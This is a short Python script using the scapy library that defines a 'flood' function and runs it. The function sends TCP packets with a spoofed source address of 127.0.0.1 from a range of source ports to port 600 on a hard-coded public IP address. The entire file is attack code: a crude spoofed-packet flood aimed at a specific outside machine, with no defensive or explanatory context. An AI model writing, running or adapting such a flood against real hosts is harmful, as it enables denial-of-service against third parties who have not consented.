from scapy.all import *

def flood(source,target):
    for source_port in range(100,150):
        ip_layer = IP(src=source, dst=target)
        tcp_player = TCP(sport=source_port, dport=600)
        pkt = ip_layer/tcp_player
        send(pkt)

source = "127.0.0.1"
target = "162.241.24.197"

flood(source,target)
